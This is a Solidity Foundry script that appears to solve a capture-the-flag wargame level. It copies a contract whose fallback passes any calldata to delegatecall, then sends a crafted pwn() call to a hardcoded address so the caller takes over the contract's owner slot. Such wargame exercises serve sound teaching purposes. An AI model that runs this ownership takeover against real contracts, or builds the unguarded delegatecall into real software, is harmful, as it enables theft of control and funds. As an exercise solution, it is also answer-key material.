// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;
import "forge-std/Script.sol";


contract Delegate {

  address public owner;

  constructor(address _owner) {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

contract DeployScript is Script {
    function setUp() public view {}

    function run() public {
        vm.startBroadcast();
        address delegationAddress = 0xc1D2fCAb814f2D5Baf5c8D68655fCECdabBBd6B7;
        bytes memory pwnSignature = abi.encodeWithSignature("pwn()");

        delegationAddress.call{value:0, gas: 39000}(pwnSignature);
    }
}